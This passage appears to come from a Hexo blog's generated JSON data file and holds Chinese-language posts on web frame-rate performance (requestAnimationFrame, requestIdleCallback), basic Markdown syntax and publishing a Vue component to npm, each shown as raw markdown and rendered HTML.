将强制执行\n\n---\n\n> [网页性能管理详解](http://www.ruanyifeng.com/blog/2015/09/web-page-performance-in-depth.html)\n","slug":"fps","published":1,"updated":"2018-06-04T06:25:18.860Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034jz000q0iofvvwm9goa","content":"<h2 id=\"fps\"><a href=\"#fps\" class=\"headerlink\" title=\"fps\"></a>fps</h2><ul>\n<li>fps 是 frame per second，一秒能够重新渲染多少个画面</li>\n<li>网页的每一帧都是一次重新渲染，一帧（frame）就是一个画面。</li>\n<li>我们平时看电视，电视上的画面连续播放，其实一个画面接着一个画面的，如果一秒有 60 个画面播放，我们看着就很流畅了。如果一秒 10 个画面，可能就会感觉像在跳机械舞一样，一顿一顿的</li>\n<li>现在大多数显示器的刷新频率都是 60Hz，浏览器一般也会自动按照这个频率，刷新动画。</li>\n<li>所以网页动画能够做到每秒 60 帧，就可以和显示器同步刷新，视觉效果达到最佳。</li>\n<li>一秒之内进行 60 次渲染，每次不能超过 16.66 毫秒</li>\n</ul>\n<blockquote>\n<p>如果想要到 60 帧的刷新率，那么 js 线程每个任务的耗时，必须少于 16ms。一个解决办法是用 web worker，主线程只用于 ui 渲染，其他和 ui 渲染不想干的任务，都放在 worker 线程。</p>\n</blockquote>\n<h2 id=\"调节渲染\"><a href=\"#调节渲染\" class=\"headerlink\" title=\"调节渲染\"></a>调节渲染</h2><blockquote>\n<p>有一些 js 方法可以调节重新渲染，大幅度提高网页性能</p>\n</blockquote>\n<h3 id=\"requestAnimationFrame\"><a href=\"#requestAnimationFrame\" class=\"headerlink\" title=\"requestAnimationFrame\"></a>requestAnimationFrame</h3><ul>\n<li>他可以将代码放到下次重新渲染执行</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doubleHeight</span>(<span class=\"params\">element</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> currentHeight = element.clientHeight;</span><br><span class=\"line\">  element.style.height = currentHeight * <span class=\"number\">2</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">elements.forEach(doubleHeight);</span><br><span class=\"line\"><span class=\"comment\">//读了马上又去写，这就会马上重排，导致重新渲染，这就对网页性能很不利</span></span><br><span class=\"line\"><span class=\"comment\">//可以使用window.requestAnimation把读写操作分离，把所有写操作放到下一次浏览器正常的重新渲染</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doubleHeight</span>(<span class=\"params\">element</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> currentHeight = element.clientHeight;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.requestAnimationFrame(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    element.style.height = currentHeight * <span class=\"number\">2</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">elements.forEach(doubleHeight);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>适用于页面滚动事件，推迟到下一次重新渲染</li>\n<li>适用于网页动画，比如</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//元素一帧旋转一度</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> rAF = <span class=\"built_in\">window</span>.requestAnimationFrame;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> degrees = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  div.style.transform = <span class=\"string\">\"rotate(\"</span> + degrees + <span class=\"string\">\"deg)\"</span>;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"updated to degrees \"</span> + degrees);</span><br><span class=\"line\">  degrees = degrees + <span class=\"number\">1</span>;</span><br><span class=\"line\">  rAF(update);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">rAF(update);</span><br></pre></td></tr></table></figure>\n<h3 id=\"requestIdleCallback\"><a href=\"#requestIdleCallback\" class=\"headerlink\" title=\"requestIdleCallback\"></a>requestIdleCallback</h3><blockquote>\n<p>只有当一帧的末尾有空闲时间，才会执行回调</p>\n</blockquote>\n<ul>\n<li>requestIdleCallback(fn)</li>\n<li>因为一秒 60 帧，一帧就 16.66ms，只有当前帧的运行时间小于 16.66ms 的时候，fn 才会执行。如果当前没有空闲时间，就推迟到下一帧，直到有空闲时间为止。</li>\n<li>requestIdleCallback(fn，5000)可以制定第二个参数，表示指定的 ms，表示这段时间内，如果每一帧都没有空间时间，fn 将强制执行</li>\n</ul>\n<hr>\n<blockquote>\n<p><a href=\"http://www.ruanyifeng.com/blog/2015/09/web-page-performance-in-depth.html\" target=\"_blank\" rel=\"noopener\">网页性能管理详解</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"fps\"><a href=\"#fps\" class=\"headerlink\" title=\"fps\"></a>fps</h2><ul>\n<li>fps 是 frame per second，一秒能够重新渲染多少个画面</li>\n<li>网页的每一帧都是一次重新渲染，一帧（frame）就是一个画面。</li>\n<li>我们平时看电视，电视上的画面连续播放，其实一个画面接着一个画面的，如果一秒有 60 个画面播放，我们看着就很流畅了。如果一秒 10 个画面，可能就会感觉像在跳机械舞一样，一顿一顿的</li>\n<li>现在大多数显示器的刷新频率都是 60Hz，浏览器一般也会自动按照这个频率，刷新动画。</li>\n<li>所以网页动画能够做到每秒 60 帧，就可以和显示器同步刷新，视觉效果达到最佳。</li>\n<li>一秒之内进行 60 次渲染，每次不能超过 16.66 毫秒</li>\n</ul>\n<blockquote>\n<p>如果想要到 60 帧的刷新率，那么 js 线程每个任务的耗时，必须少于 16ms。一个解决办法是用 web worker，主线程只用于 ui 渲染，其他和 ui 渲染不想干的任务，都放在 worker 线程。</p>\n</blockquote>\n<h2 id=\"调节渲染\"><a href=\"#调节渲染\" class=\"headerlink\" title=\"调节渲染\"></a>调节渲染</h2><blockquote>\n<p>有一些 js 方法可以调节重新渲染，大幅度提高网页性能</p>\n</blockquote>\n<h3 id=\"requestAnimationFrame\"><a href=\"#requestAnimationFrame\" class=\"headerlink\" title=\"requestAnimationFrame\"></a>requestAnimationFrame</h3><ul>\n<li>他可以将代码放到下次重新渲染执行</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doubleHeight</span>(<span class=\"params\">element</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> currentHeight = element.clientHeight;</span><br><span class=\"line\">  element.style.height = currentHeight * <span class=\"number\">2</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">elements.forEach(doubleHeight);</span><br><span class=\"line\"><span class=\"comment\">//读了马上又去写，这就会马上重排，导致重新渲染，这就对网页性能很不利</span></span><br><span class=\"line\"><span class=\"comment\">//可以使用window.requestAnimation把读写操作分离，把所有写操作放到下一次浏览器正常的重新渲染</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doubleHeight</span>(<span class=\"params\">element</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> currentHeight = element.clientHeight;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.requestAnimationFrame(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    element.style.height = currentHeight * <span class=\"number\">2</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">elements.forEach(doubleHeight);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>适用于页面滚动事件，推迟到下一次重新渲染</li>\n<li>适用于网页动画，比如</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//元素一帧旋转一度</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> rAF = <span class=\"built_in\">window</span>.requestAnimationFrame;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> degrees = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  div.style.transform = <span class=\"string\">\"rotate(\"</span> + degrees + <span class=\"string\">\"deg)\"</span>;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"updated to degrees \"</span> + degrees);</span><br><span class=\"line\">  degrees = degrees + <span class=\"number\">1</span>;</span><br><span class=\"line\">  rAF(update);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">rAF(update);</span><br></pre></td></tr></table></figure>\n<h3 id=\"requestIdleCallback\"><a href=\"#requestIdleCallback\" class=\"headerlink\" title=\"requestIdleCallback\"></a>requestIdleCallback</h3><blockquote>\n<p>只有当一帧的末尾有空闲时间，才会执行回调</p>\n</blockquote>\n<ul>\n<li>requestIdleCallback(fn)</li>\n<li>因为一秒 60 帧，一帧就 16.66ms，只有当前帧的运行时间小于 16.66ms 的时候，fn 才会执行。如果当前没有空闲时间，就推迟到下一帧，直到有空闲时间为止。</li>\n<li>requestIdleCallback(fn，5000)可以制定第二个参数，表示指定的 ms，表示这段时间内，如果每一帧都没有空间时间，fn 将强制执行</li>\n</ul>\n<hr>\n<blockquote>\n<p><a href=\"http://www.ruanyifeng.com/blog/2015/09/web-page-performance-in-depth.html\" target=\"_blank\" rel=\"noopener\">网页性能管理详解</a></p>\n</blockquote>\n"},{"title":"Hello World","date":"2017-01-15T09:17:08.000Z","_content":"\n> 在程序的世界里，开始的话就循例来一个 hello world\n\n# 一级标题\n\n> 在文字前面加上**#**表示标题\n\n##### 标题一共有六级（6 个#号）\n\n在**#**后面加上空格，才是标准的 md 语法\n\n# 列表\n\n> 在文字前面加上-\n\n* 列表 1\n* 列表 2\n\n# 引用\n\n> 在文字前面加上*>*\n\n# 图片与链接\n\n> 插入链接与图片的语法的区别在于一个!号;\n\n```javascript\n> 图片为：![](relative address);\n> 链接为：[]();\n```\n\n# 粗体\n\n> 两个\\*\\*包含一段文本就是粗体\n\n**粗体**\n\n# 表格\n\n```javascript\n| Tables        | Are           | Cool  |\n| ------------- |:-------------:| -----:|\n| col 3 is      | right-aligned | $1600 |\n| col 2 is      | centered      |   $12 |\n| zebra stripes | are neat      |    $1 |\n```\n\n| Tables        |      Are      |  Cool |\n| ------------- | :-----------: | ----: |\n| col 3 is      | right-aligned | $1600 |\n| col 2 is      |   centered    |   $12 |\n| zebra stripes |   are neat    |    $1 |\n\n# 代码框\n\n> 用三个` 把中间的代码包裹,在第一段点之后加语言名可以显示代码高亮\n\n```javascript\nconsole.log(12);\n```\n\n# 分割线\n\n> 分割线的语法为三个-\n\n---\n","source":"_posts/helloWorld.md","raw":"---\ntitle: Hello World\ndate: 2017-01-15 17:17:08\ntags: markdown\n---\n\n> 在程序的世界里，开始的话就循例来一个 hello world\n\n# 一级标题\n\n> 在文字前面加上**#**表示标题\n\n##### 标题一共有六级（6 个#号）\n\n在**#**后面加上空格，才是标准的 md 语法\n\n# 列表\n\n> 在文字前面加上-\n\n* 列表 1\n* 列表 2\n\n# 引用\n\n> 在文字前面加上*>*\n\n# 图片与链接\n\n> 插入链接与图片的语法的区别在于一个!号;\n\n```javascript\n> 图片为：![](relative address);\n> 链接为：[]();\n```\n\n# 粗体\n\n> 两个\\*\\*包含一段文本就是粗体\n\n**粗体**\n\n# 表格\n\n```javascript\n| Tables        | Are           | Cool  |\n| ------------- |:-------------:| -----:|\n| col 3 is      | right-aligned | $1600 |\n| col 2 is      | centered      |   $12 |\n| zebra stripes | are neat      |    $1 |\n```\n\n| Tables        |      Are      |  Cool |\n| ------------- | :-----------: | ----: |\n| col 3 is      | right-aligned | $1600 |\n| col 2 is      |   centered    |   $12 |\n| zebra stripes |   are neat    |    $1 |\n\n# 代码框\n\n> 用三个` 把中间的代码包裹,在第一段点之后加语言名可以显示代码高亮\n\n```javascript\nconsole.log(12);\n```\n\n# 分割线\n\n> 分割线的语法为三个-\n\n---\n","slug":"helloWorld","published":1,"updated":"2018-04-13T07:36:46.048Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034k0000s0iofqdk4exwz","content":"<blockquote>\n<p>在程序的世界里，开始的话就循例来一个 hello world</p>\n</blockquote>\n<h1 id=\"一级标题\"><a href=\"#一级标题\" class=\"headerlink\" title=\"一级标题\"></a>一级标题</h1><blockquote>\n<p>在文字前面加上<strong>#</strong>表示标题</p>\n</blockquote>\n<h5 id=\"标题一共有六级（6-个-号）\"><a href=\"#标题一共有六级（6-个-号）\" class=\"headerlink\" title=\"标题一共有六级（6 个#号）\"></a>标题一共有六级（6 个#号）</h5><p>在<strong>#</strong>后面加上空格，才是标准的 md 语法</p>\n<h1 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h1><blockquote>\n<p>在文字前面加上-</p>\n</blockquote>\n<ul>\n<li>列表 1</li>\n<li>列表 2</li>\n</ul>\n<h1 id=\"引用\"><a href=\"#引用\" class=\"headerlink\" title=\"引用\"></a>引用</h1><blockquote>\n<p>在文字前面加上<em>&gt;</em></p>\n</blockquote>\n<h1 id=\"图片与链接\"><a href=\"#图片与链接\" class=\"headerlink\" title=\"图片与链接\"></a>图片与链接</h1><blockquote>\n<p>插入链接与图片的语法的区别在于一个!号;</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 图片为：![](relative address);</span><br><span class=\"line\">&gt; 链接为：[]();</span><br></pre></td></tr></table></figure>\n<h1 id=\"粗体\"><a href=\"#粗体\" class=\"headerlink\" title=\"粗体\"></a>粗体</h1><blockquote>\n<p>两个**包含一段文本就是粗体</p>\n</blockquote>\n<p><strong>粗体</strong></p>\n<h1 id=\"表格\"><a href=\"#表格\" class=\"headerlink\" title=\"表格\"></a>表格</h1><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">| Tables        | Are           | Cool  |</span><br><span class=\"line\">| ------------- |:-------------:| -----:|</span><br><span class=\"line\">| col <span class=\"number\">3</span> is      | right-aligned | $<span class=\"number\">1600</span> |</span><br><span class=\"line\">| col <span class=\"number\">2</span> is      | centered      |   $<span class=\"number\">12</span> |</span><br><span class=\"line\">| zebra stripes | are neat      |    $<span class=\"number\">1</span> |</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th>Tables</th>\n<th style=\"text-align:center\">Are</th>\n<th style=\"text-align:right\">Cool</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>col 3 is</td>\n<td style=\"text-align:center\">right-aligned</td>\n<td style=\"text-align:right\">$1600</td>\n</tr>\n<tr>\n<td>col 2 is</td>\n<td style=\"text-align:center\">centered</td>\n<td style=\"text-align:right\">$12</td>\n</tr>\n<tr>\n<td>zebra stripes</td>\n<td style=\"text-align:center\">are neat</td>\n<td style=\"text-align:right\">$1</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"代码框\"><a href=\"#代码框\" class=\"headerlink\" title=\"代码框\"></a>代码框</h1><blockquote>\n<p>用三个` 把中间的代码包裹,在第一段点之后加语言名可以显示代码高亮</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"number\">12</span>);</span><br></pre></td></tr></table></figure>\n<h1 id=\"分割线\"><a href=\"#分割线\" class=\"headerlink\" title=\"分割线\"></a>分割线</h1><blockquote>\n<p>分割线的语法为三个-</p>\n</blockquote>\n<hr>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>在程序的世界里，开始的话就循例来一个 hello world</p>\n</blockquote>\n<h1 id=\"一级标题\"><a href=\"#一级标题\" class=\"headerlink\" title=\"一级标题\"></a>一级标题</h1><blockquote>\n<p>在文字前面加上<strong>#</strong>表示标题</p>\n</blockquote>\n<h5 id=\"标题一共有六级（6-个-号）\"><a href=\"#标题一共有六级（6-个-号）\" class=\"headerlink\" title=\"标题一共有六级（6 个#号）\"></a>标题一共有六级（6 个#号）</h5><p>在<strong>#</strong>后面加上空格，才是标准的 md 语法</p>\n<h1 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h1><blockquote>\n<p>在文字前面加上-</p>\n</blockquote>\n<ul>\n<li>列表 1</li>\n<li>列表 2</li>\n</ul>\n<h1 id=\"引用\"><a href=\"#引用\" class=\"headerlink\" title=\"引用\"></a>引用</h1><blockquote>\n<p>在文字前面加上<em>&gt;</em></p>\n</blockquote>\n<h1 id=\"图片与链接\"><a href=\"#图片与链接\" class=\"headerlink\" title=\"图片与链接\"></a>图片与链接</h1><blockquote>\n<p>插入链接与图片的语法的区别在于一个!号;</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 图片为：![](relative address);</span><br><span class=\"line\">&gt; 链接为：[]();</span><br></pre></td></tr></table></figure>\n<h1 id=\"粗体\"><a href=\"#粗体\" class=\"headerlink\" title=\"粗体\"></a>粗体</h1><blockquote>\n<p>两个**包含一段文本就是粗体</p>\n</blockquote>\n<p><strong>粗体</strong></p>\n<h1 id=\"表格\"><a href=\"#表格\" class=\"headerlink\" title=\"表格\"></a>表格</h1><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">| Tables        | Are           | Cool  |</span><br><span class=\"line\">| ------------- |:-------------:| -----:|</span><br><span class=\"line\">| col <span class=\"number\">3</span> is      | right-aligned | $<span class=\"number\">1600</span> |</span><br><span class=\"line\">| col <span class=\"number\">2</span> is      | centered      |   $<span class=\"number\">12</span> |</span><br><span class=\"line\">| zebra stripes | are neat      |    $<span class=\"number\">1</span> |</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th>Tables</th>\n<th style=\"text-align:center\">Are</th>\n<th style=\"text-align:right\">Cool</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>col 3 is</td>\n<td style=\"text-align:center\">right-aligned</td>\n<td style=\"text-align:right\">$1600</td>\n</tr>\n<tr>\n<td>col 2 is</td>\n<td style=\"text-align:center\">centered</td>\n<td style=\"text-align:right\">$12</td>\n</tr>\n<tr>\n<td>zebra stripes</td>\n<td style=\"text-align:center\">are neat</td>\n<td style=\"text-align:right\">$1</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"代码框\"><a href=\"#代码框\" class=\"headerlink\" title=\"代码框\"></a>代码框</h1><blockquote>\n<p>用三个` 把中间的代码包裹,在第一段点之后加语言名可以显示代码高亮</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"number\">12</span>);</span><br></pre></td></tr></table></figure>\n<h1 id=\"分割线\"><a href=\"#分割线\" class=\"headerlink\" title=\"分割线\"></a>分割线</h1><blockquote>\n<p>分割线的语法为三个-</p>\n</blockquote>\n<hr>\n"},{"title":"npm上发布vue组件","date":"2018-09-27T13:05:42.000Z","_content":"\n## 创建组件\n\n- 通过 vue-cli 3 来创建一个组件\n\n#### 为什么通过 vue-cli3\n\n- 该脚手架允许构建不同的目标，包括应用，库\n\n## 修改 src 目录文件如下\n\n- src\n  - index.js(插件入口)\n  - fullpage.vue（组件）\n\n## 修改 package.json 的 script\n\n```javascript\n\"scripts\": {\n    \"serve\": \"vue-cli-service serve\",\n    // build lib\n    \"build:lib\": \"vue-cli-service build --target lib --name v-fullpage ./src/index.js\",\n    \"lint\": \"vue-cli-service lint\"\n}\n```\n\n## 打包生成第三方库\n\n- yarn build:lib\n- 根目录下就会出现 dist 文件夹，包含不同版本的 .js 文件，而 v-fullpage.umd.min.js 文件就是给到用户使用的第三方库了\n\n## 上传 npm\n\n- npm login\n- package.json\n\n```javascript\n\"name\": \"v-fullpage\", // 包名,上传名字前到npm查看是否有同名\n\"description\": \"A Vue.js components\",//对包的描述，在npmjs.com上搜索时会显示，有助于用户在搜索时进行筛选\n\"version\": \"0.2.0\", // 每次发布需比上一个版本高,不然不给你发布的\n\"author\": \"youjie <419703726@qq.com>\",\n\"private\": false,\n\"main\": \"dist/v-fullpage.umd.min.js\", // 入口,import pkg from 'package-name'时，其实导入的就是main定义的文件，它可以是CommonJs格式的, 也可以是umd格式。需要注意的是，当你把一个包发布到npm上时，它同时也可以在unpkg上获取到。也就是说，你的代码既可能在NodeJs环境也可能浏览器环境执行。为此你需要用umd格式打包，并且在package.json定义unpkg字段，一般而言此时它的命名为name.min.js\n\"repository\": {\n    \"type\": \"git\",\n    \"url\": \"https://github.com/yokiyokiyoki/vue-fullpage.git\"\n},\n\"bugs\": {\n    \"url\": \"https://github.com/yokiyokiyoki/vue-fullpage/issues\"\n},\n\"keywords\": [\n    \"vue\",//有助于用户搜索\n    \"vue-component\"\n],\n\"private\": false,//false才行\n```\n\n- npm publish\n\n## 参考\n\n- [vue-fullpage](https://github.com/yokiyokiyoki/vue-fullpage)\n","source":"_posts/publish-vue-component.md","raw":"---\ntitle: npm上发布vue组件\ndate: 2018-09-27 21:05:42\ntags: vue\n---\n\n## 创建组件\n\n- 通过 vue-cli 3 来创建一个组件\n\n#### 为什么通过 vue-cli3\n\n- 该脚手架允许构建不同的目标，包括应用，库\n\n## 修改 src 目录文件如下\n\n- src\n  - index.js(插件入口)\n  - fullpage.vue（组件）\n\n## 修改 package.json 的 script\n\n```javascript\n\"scripts\": {\n    \"serve\": \"vue-cli-service serve\",\n    // build lib\n    \"build:lib\": \"vue-cli-service build --target lib --name v-fullpage ./src/index.js\",\n    \"lint\": \"vue-cli-service lint\"\n}\n```\n\n## 打包生成第三方库\n\n- yarn build:lib\n- 根目录下就会出现 dist 文件夹，包含不同版本的 .js 文件，而 v-fullpage.umd.min.js 文件就是给到用户使用的第三方库了\n\n## 上传 npm\n\n- npm login\n- package.json\n\n```javascript\n\"name\": \"v-fullpage\", // 包名,上传名字前到npm查看是否有同名\n\"description\": \"A Vue.js components\",//对包的描述，在npmjs.com上搜索时会显示，有助于用户在搜索时进行筛选\n\"version\": \"0.2.0\", // 每次发布需比上一个版本高,不然不给你发布的\n\"author\": \"youjie <419703726@qq.com>\",\n\"private\": false,\n\"main\": \"dist/v-fullpage.umd.min.js\", // 入口,import pkg from 'package-name'时，其实导入的就是main定义的文件，它可以是CommonJs格式的, 也可以是umd格式。需要注意的是，当你把一个包发布到npm上时，它同时也可以在unpkg上获取到。也就是说，你的代码既可能在NodeJs环境也可能浏览器环境执行。为此你需要用umd格式打包，并且在package.json定义unpkg字段，一般而言此时它的命名为name.min.js\n\"repository\": {\n    \"type\": \"git\",\n    \"url\": \"https://github.com/yokiyokiyoki/vue-fullpage.git\"\n},\n\"bugs\": {\n    \"url\": \"https://github.com/yokiyokiyoki/vue-fullpage/issues\"\n},\n\"keywords\": [\n    \"vue\",//有助于用户搜索\n    \"vue-component\"\n],\n\"private\": false,//false才行\n```\n\n- npm publish\n\n## 参考\n\n- [vue-fullpage](https://github.com/yokiyokiyoki/vue-fullpage)\n","slug":"publish-vue-component","published":1,"updated":"2018-09-27T13:30:13.013Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034k1000u0iofjoik5hef","content":"<h2 id=\"创建组件\"><a href=\"#创建组件\" class=\"headerlink\" title=\"创建组件\"></a>创建组件</h2><ul>\n<li>通过 vue-cli 3 来创建一个组件</li>\n</ul>\n<h4 id=\"为什么通过-vue-cli3\"><a href=\"#为什么通过-vue-cli3\" class=\"headerlink\" title=\"为什么通过 vue-cli3\"></a>为什么通过 vue-cli3</h4><ul>\n<li>该脚手架允许构建不同的目标，包括应用，库</li>\n</ul>\n<h2 id=\"修改-src-目录文件如下\"><a href=\"#修改-src-目录文件如下\" class=\"headerlink\" title=\"修改 src 目录文件如下\"></a>修改 src 目录文件如下</h2><ul>\n<li>src<ul>\n<li>index.js(插件入口)</li>\n<li>fullpage.vue（组件）</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"修改-package-json-的-script\"><a href=\"#修改-package-json-的-script\" class=\"headerlink\" title=\"修改 package.json 的 script\"></a>修改 package.json 的 script</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"scripts\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"serve\"</span>: <span class=\"string\">\"vue-cli-service serve\"</span>,</span><br><span class=\"line\">    <span class=\"comment\">// build lib</span></span><br><span class=\"line\">    <span class=\"string\">\"build:lib\"</span>: <span class=\"string\">\"vue-cli-service build --target lib --name v-fullpage ./src/index.js\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"lint\"</span>: <span class=\"string\">\"vue-cli-service lint\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"打包生成第三方库\"><a href=\"#打包生成第三方库\" class=\"headerlink\" title=\"打包生成第三方库\"></a>打包生成第三方库</h2><ul>\n<li>yarn build:lib</li>\n<li>根目录下就会出现 dist 文件夹，包含不同版本的 .js 文件，而 v-fullpage.umd.min.js 文件就是给到用户使用的第三方库了</li>\n</ul>\n<h2 id=\"上传-npm\"><a href=\"#上传-npm\" class=\"headerlink\" title=\"上传 npm\"></a>上传 npm</h2><ul>\n<li>npm login</li>\n<li>package.json</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"name\"</span>: <span class=\"string\">\"v-fullpage\"</span>, <span class=\"comment\">// 包名,上传名字前到npm查看是否有同名</span></span><br><span class=\"line\"><span class=\"string\">\"description\"</span>: <span class=\"string\">\"A Vue.js components\"</span>,<span class=\"comment\">//对包的描述，在npmjs.com上搜索时会显示，有助于用户在搜索时进行筛选</span></span><br><span class=\"line\"><span class=\"string\">\"version\"</span>: <span class=\"string\">\"0.2.0\"</span>, <span class=\"comment\">// 每次发布需比上一个版本高,不然不给你发布的</span></span><br><span class=\"line\"><span class=\"string\">\"author\"</span>: <span class=\"string\">\"youjie &lt;419703726@qq.com&gt;\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"private\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">\"main\"</span>: <span class=\"string\">\"dist/v-fullpage.umd.min.js\"</span>, <span class=\"comment\">// 入口,import pkg from 